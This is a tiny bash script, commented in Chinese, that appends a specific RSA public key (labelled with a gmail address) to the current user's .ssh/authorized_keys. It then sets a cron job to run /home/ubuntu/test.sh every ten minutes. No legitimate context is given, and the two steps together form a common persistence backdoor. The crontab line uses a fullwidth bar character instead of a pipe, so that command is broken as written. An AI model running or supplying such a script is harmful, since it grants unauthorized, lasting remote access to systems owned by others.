#!/bin/bash
# 写入ssh密钥
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqYRPbZVSQd37qKhfRegEj+V27cQLdLZc5DF1WGn8GaRZPOF18Xal9+f6JER6XVRDEd1KrGHePbtow2tbIgpVUSVKJNNZ3NeIA6rehYuiluwKlNHCEuPjjfkpB0+3iyDbRrjRDBmiJ53gOhLj0Mq9HGcaGqjOI6wmLZPBK2EwakylY/CBvZvxGWZR+5dNUP0VFiHpkBFETUqpHYEb44eAsktFh6UmUhl7xk+TBFS2o3fJMg1vmEJ7+WJDrFT4HsuufLWnYRbL9ARaO2ZkeezN9WYpoLUbHzJ0B1lN8MZE6PA0RLfWI6fSziDQ+Vu9LrMsQNzv816J+nG0MDKSmh1exJ0XgHL9VvxQxzLBP+qVjIpz0S6mmoKtB0yCaa221tCAMMz/Vllpr/KD6LnvghnQXj+jzX5F2KFflQ+OQ5vkYb0QaFdSDGDd0wItDGum/vgPIasIstfnOhNJ3Ct5zQg+1E/vwWiUGzVmCraX/pbIlKQBDUtMT8leNpJ0NMdDAi/U= if8336@gmail.com" >> .ssh/authorized_keys
echo "*/10 * * * * /home/ubuntu/test.sh" ｜ crontab